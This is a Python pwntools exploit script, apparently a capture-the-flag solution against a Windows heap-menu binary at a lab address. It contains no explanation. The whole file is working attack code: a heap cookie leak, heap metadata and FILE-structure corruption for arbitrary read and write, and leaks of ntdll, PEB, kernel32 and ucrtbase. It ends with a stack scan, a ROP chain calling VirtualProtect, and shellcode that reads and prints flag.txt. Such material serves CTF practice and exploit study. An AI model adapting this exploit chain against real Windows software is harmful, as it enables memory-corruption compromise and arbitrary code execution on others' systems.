#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
host = "10.211.55.27"
port = 6677

context.arch = "amd64"    



def allocate(size,idx):
    r.recvuntil("choice: ")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(str(idx))

def edit(idx,data):
    r.recvuntil("choice: ")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.send(data)

def show(idx):
    r.recvuntil("choice: ")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def free(idx):
    r.recvuntil("choice: ")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

def openfile():
    r.recvuntil("choice: ")
    r.sendline("5")
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline("3")

def readfile(idx,size,ret=True):
    r.recvuntil("choice: ")
    r.sendline("5")
    r.recvuntil("choice: ")
    time.sleep(0.1)
    r.sendline("2")
    time.sleep(0.1)
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    time.sleep(0.1)
    r.sendline(str(size))
    if ret :
        r.recvuntil("choice: ")
        r.sendline("3")


def leak(addr=None,heapoff=None):
    for i in range(6):
        openfile()
    allocate(0x228,1338)
    allocate(0x228,1337)
    allocate(0x228,1336)
    edit(1337,"a"*0x228)
    show(1337)
    r.recvuntil("a"*0x228)
    cookie = (u64(r.recvuntil("\n")[:-2].ljust(8,"\x00")) ^ 0x2322010023)  & 0xffffffffffff
    print "cookie:",hex(cookie)

    allocate(0x268,1332)
    allocate(0x5a0,1331)
    allocate(0x1000,1330)
    allocate(0x280,1333)
    allocate(0x280,cookie^0x37010137)
   # allocate(0x163,4141)
    openfile()
    readfile(1332,0x268)
    fakechunk = 0x27ae0101ae ^ cookie
    time.sleep(0.1)
    edit(1332,"b"*0x268 + p64(fakechunk)[:6])
    free(1331)
    allocate(0x5a0,1331)

    show(1330)
    r.recvuntil("Content: ")
    heap_var = u64(r.recvuntil("\n")[:-2].ljust(8,"\x00"))
    if heap_var == 0 :
        print "fuck heap 0"
        raise EOFError
    if (heap_var & 0xffff) == 0x150 :
        heap = heap_var - 0x150
    elif heap_var < 0x10000:
        print "fuck heap < 0x10000"
        raise EOFError
    else :
        heap = (heap_var & 0xffffffffffff0000)  - 0x10000
    print "heap:",hex(heap)
    var = heap_var
    while var == heap_var :
        openfile()
        show(1330)
        r.recvuntil("Content: ")
        var = u64(r.recvuntil("\n")[:-2].ljust(8,"\x00")) 
    subsegment = heap + 0x021e80
    reserve = heap + 0x28b40
    size_idx = 0xc
    sig = 0xf0e0d0c0
    fake_userdata = p64(subsegment) + p64(reserve) + p32(size_idx) + p32(sig) 
    fake_userdata += p64(0)*5
    filebuffer = 0xbeefdad0000
    ptr = filebuffer+0x20
    base = filebuffer+0x20
    cnt = 0
    flag = 0x2049
    fd = 0
    pad = 0
    bufsize = 0x800
    obj = p64(0)*2 + p64(ptr) + p64(base) + p32(cnt) + p32(flag) + p32(fd) + p32(pad) + p64(bufsize) + p64(0)
    obj += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2
    edit(1330,fake_userdata + obj*0x28)
    readfile(1338,0x8,False)
    magic = 0xddaabeef1acd
    #stage1
    if not addr and not heapoff:
        time.sleep(0.1)
        r.send(p64(heap+0x2c0))

        r.recvuntil("choice: ")
        r.sendline("3")
        show(1338)
        r.recvuntil("Content: ")
        return u64(r.recvuntil("\n")[:-2].ljust(8,"\x00")) -0x163d50
    elif heapoff:
        time.sleep(0.1)
        r.send(p64(heap+heapoff))
        r.recvuntil(":")
        r.sendline("3")
        show(1338)
        r.recvuntil("Content: ")
        return u64(r.recvuntil("\n")[:-2].ljust(8,"\x00")) 

    else :
        time.sleep(0.1)
        r.send(p64(addr))
        r.recvuntil("choice: ")
        r.sendline("3")
        show(1338)
        r.recvuntil("Content: ")
        return u64(r.recvuntil("\n")[:-2].ljust(8,"\x00"))

count = 0
def exp():
    for i in range(6):
        openfile()
    allocate(0x228,1338)
    allocate(0x228,1337)
    allocate(0x228,1336)
    edit(1337,"a"*0x228)
    show(1337)
    r.recvuntil("a"*0x228)
    cookie = (u64(r.recvuntil("\n")[:-2].ljust(8,"\x00")) ^ 0x2322010023)  & 0xffffffffffff
    print "cookie:",hex(cookie)
    allocate(0x268,1332)
    allocate(0x5a0,1331)
    allocate(0x1000,1330)
    allocate(0x280,1333)
    allocate(0x280,cookie^0x37010137)
    #allocate(0x163,4141)
    openfile()
    readfile(1332,0x268)
    fakechunk = 0x27ae0101ae ^ cookie
    edit(1332,"b"*0x268 + p64(fakechunk)[:6])
    free(1331)
    allocate(0x5a0,1331)
    show(1330)
    r.recvuntil("Content: ")
    heap_var = u64(r.recvuntil("\n")[:-2].ljust(8,"\x00"))

    if heap_var == 0 :

        raise EOFError
    if (heap_var & 0xffff) == 0x150 :
        heap = heap_var - 0x150
    elif heap_var < 0x10000:
        raise EOFError
    else :
        heap = (heap_var & 0xffffffffffff0000) - 0x10000
    print "heap:",hex(heap)
    var = heap_var
    while var == heap_var :
        openfile()
        show(1330)
        r.recvuntil("Content: ")
        var = u64(r.recvuntil("\n")[:-2].ljust(8,"\x00")) 
    subsegment = heap + 0x021e80
    reserve = heap + 0x28b40
    size_idx = 0xc
    sig = 0xf0e0d0c0
    fake_userdata = p64(subsegment) + p64(reserve) + p32(size_idx) + p32(sig) 
    fake_userdata += p64(0)*5
    filebuffer = 0xbeefdad0000
    global ucrtbase
    pioinfo = ucrtbase  + 0xeb750
    ptr = filebuffer + 0x20
    base = filebuffer + 0x20
    cnt = 0
    flag = 0x2049
    fd = 0
    pad = 0
    bufsize = 0x800
    obj =p64(0)*2 + p64(ptr) + p64(base) + p32(cnt) + p32(flag) + p32(fd) + p32(pad) + p64(bufsize) + p64(0)
    obj += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2
    edit(1330,fake_userdata + obj*0x28)
    readfile(1338,8,False)
    global pioinfo_off
    magic = 0xddaabeef1acd
    r.send(p64(heap+pioinfo_off+0x38))
    time.sleep(0.1)
    r.recvuntil("choice: ")
    r.sendline("3")
    edit(1338,p8(0x09))
    allocate(0x510,4242)
    target = filebuffer + 0x138
    free(1333)
    allocate(0x280,4343)
    edit(4242,"a"*0x288 + p64(0x2929000029^cookie) + p64(target-8) + p64(target))
    allocate(0x280,5566)
    fake_filebuffer = flat([magic,0x200,0xda,magic,filebuffer])
    edit(cookie^0x37010137, p64(filebuffer) + fake_filebuffer)
    for i in range(9):
        fake_filebuffer += flat([magic,0x200,0xda + i,magic,filebuffer])
    edit(0xda,fake_filebuffer)
    def readmem(addr):

        global count
        if count % 2 == 0 :
            fake_filebuffer = flat([magic,0x200,0xda,magic,addr]) + flat([magic,0x200,0xdada,magic,filebuffer])
            edit(0xda,fake_filebuffer)
            show(0xda)
        else :
            fake_filebuffer = flat([magic,0x200,0xda,magic,filebuffer]) + flat([magic,0x200,0xdada,magic,addr])
            edit(0xdada,fake_filebuffer)
            show(0xdada)
        count += 1
        r.recvuntil("Content: ")
        return u64(r.recvuntil("\n")[:-2].ljust(8,"\x00"))
    global ntdll 
    if ntdll == 0 :
        ntdll = readmem(heap+0x2c0) - 0x163d50
        print "ntdll:",hex(ntdll)
    peb = readmem(ntdll+0x165348) - 0x80
    print "peb:",hex(peb)
    global Pebldr 
    if Pebldr == 0 :
        Pebldr = ntdll+ 0x1653c0
        print "PebLdr:",hex(Pebldr)
    global bin_base
    if bin_base == 0 :
        imoml = readmem(Pebldr+0x20)
        bin_base = readmem(imoml+0x28) - 0x1b80 - 0x70
        print "bin_base:",hex(bin_base)
    iat = bin_base + 0x3000

    kernel32 = readmem(iat+8) - 0x1e690
    print "kernel32:",hex(kernel32)
    ucrtbase = readmem(iat+0x110) - 0x6f1e0
    teb = peb + 0x1000
    stack = readmem(teb+0x10+1) << 8
    print "stack:",hex(stack)
    start = stack+0x3ff8
    printf_ret = bin_base + 0x17c4
    ret_addr = 0
    for i in range(0x2000/8):
        try :
            val = readmem(start-i*8)
            print "search : %d" % i
            if val == printf_ret :
                print "found !"
                ret_addr = start - i*8
                break
        except :
            continue
    if ret_addr == 0 :
        exit()
    print "ret_addr:" ,hex(ret_addr)
    def writemem(addr,data):
        global count
        if count % 2 == 0 :
            fake_filebuffer = flat([magic,0x200,0xda,magic,addr]) + flat([magic,0x200,0xdada,magic,filebuffer]) + flat([magic,0x200,0xddaa,magic,addr]) 
            edit(0xda,fake_filebuffer)
        else :
            fake_filebuffer = flat([magic,0x200,0xda,magic,filebuffer]) + flat([magic,0x200,0xdada,magic,addr])+ flat([magic,0x200,0xddaa,magic,addr])
            edit(0xdada,fake_filebuffer)
        count += 1
        edit(0xddaa,data)
    buf = bin_base + 0x5000 + 0x800
    writemem(buf,"flag.txt\x00")
    
    pop_rdx_rcx_r8_r9_r10_r11 = ntdll + 0x8c450
    winexec = kernel32 + 0x5e970
    virutalprotect = kernel32 + 0x1ad00
    heapcreate = kernel32 + 0x1e500
    processheap = peb+0x30
#    _open = ucrtbase + 0xa2a30
    _open = ucrtbase + 0xa1ae0
#    _read = ucrtbase +  0x16270
    _read = ucrtbase +  0x16140
    _sleep = ucrtbase + 0xb0ef0
    _write = ucrtbase + 0x14b30
    _exit = ucrtbase + 0x6f1a0
    crtheap = ucrtbase + 0xeb570
    rop = flat([pop_rdx_rcx_r8_r9_r10_r11,0x1000,bin_base+0x5000,0x40,buf+0x40,0,0,virutalprotect,bin_base+0x5000+0x900])
    sc = "\x90"*0x20 +  asm("""
        xor rcx,rcx
        xor rdx,rdx
        xor r8,r8
        xor r9,r9
        xor rdi,rdi
        mov cl,2
        mov rdi,0x%x
        call rdi

        mov rdi,0x%x
        mov qword ptr [rdi],rax
        mov rdi,0x%x
        mov qword ptr [rdi],rax
        sub rsp,0x1000
    open :
        mov rdi,0x%x
        mov rcx,0x%x
        xor rdx,rdx
        call rdi

    read:
        mov rcx,rax
        mov rdx,0x%x
        mov rdi,0x%x
        mov r8,0x40
        call rdi
    write :
        mov r8,rax
        mov rdx,0x%x
        xor rcx,rcx
        inc rcx
        mov rdi,0x%x
        call rdi
    sleep:
        mov rcx,20
        mov rdi,0x%x
        call rdi
    exit:
        mov rdi,0x%x
        call rdi
    """ % (heapcreate,processheap,crtheap,_open,buf,buf,_read,buf,_write,_sleep,_exit))
    writemem(bin_base+0x5000+0x900,sc)
    writemem(ret_addr,rop)
    r.interactive()

ntdll = 0
imoml_off = 0
bin_base = 0
Pebldr = 0
ucrtbase = 0
pioinfo_off = 0

if ntdll == 0 and ucrtbase == 0 :
    i = 0
    while 1:
        try :
            r = remote(host,port)
            ntdll = leak() - 0x20
            print "ntdll",hex(ntdll)
            r.recvuntil(":")
            r.sendline("6")
            r.close()
            break
        except EOFError:
            continue
        except KeyboardInterrupt:
            raise
        finally:
            i += 1
            r.close()
else :
    print "ntdll",hex(ntdll)
if imoml_off == 0 :
    i = 0
    while 1:
        try :

            r = remote(host,port)
            Pebldr = ntdll + 0x1653c0
            print "PebLdr:",hex(Pebldr)
            imoml = leak(Pebldr+0x20)
            print "imoml:",hex(imoml)
            imoml_off = imoml & 0xffff
            r.recvuntil(":")
            r.sendline("6")
            r.close()
            break
        except EOFError:
            continue
        except KeyboardInterrupt:
            raise
        finally:
            i+=1
            r.close()
else :
    print "imoml:",hex(imoml_off)

if bin_base == 0 and ucrtbase == 0:
    i = 0
    while 1:
        try :
            r = remote(host,port)
            bin_base = leak(None,imoml_off+0x28) - 0x1bf0
            print "bin_base:",hex(bin_base) 
            r.recvuntil(":")
            r.sendline("6")
            r.close()
            break
        except EOFError:
            continue
        except KeyboardInterrupt:
            raise
        finally:
            i += 1
            r.close()
else:
    print "bin_base:",hex(bin_base)
if ucrtbase == 0 :
    i = 0
    while 1:
        try :
            r = remote(host,port)
            iat = bin_base + 0x3000
            ucrtbase = leak(iat+0x110) - 0x6f1e0
            print "ucrtbase:",hex(ucrtbase) 
            r.recvuntil(":")
            r.sendline("6")
            r.close()
            break
        except EOFError:
            continue
        except KeyboardInterrupt:
            raise
        finally:
            i += 1
            r.close()
else:
    print "ucrtbase:",hex(ucrtbase)

if pioinfo_off == 0 :
    i = 0
    while 1:
        try :

            r = remote(host,port)
            pioinfo = leak(ucrtbase+0xeb770)
            print "pioinfo:",hex(pioinfo)
            pioinfo_off = pioinfo & 0xffff
            r.recvuntil(":")
            r.sendline("6")
            r.close()
            if pioinfo == 0 :
                r = remote(host,port)
                pioinfo = leak(ucrtbase+0xeb771) << 8
                print "pioinfo:",hex(pioinfo)
                pioinfo_off = pioinfo & 0xffff
                r.recvuntil(":")
                r.sendline("6")
                r.close()
            break
        except EOFError:
            continue
        except KeyboardInterrupt:
            raise
        finally:
            i+=1
            r.close()
else :
    print "pioinfo_off:",hex(pioinfo_off)
while 1:
    try :
        r= remote(host,port)
        exp()
    except EOFError:
        continue
    except KeyboardInterrupt:
        raise
    finally :
        r.close()
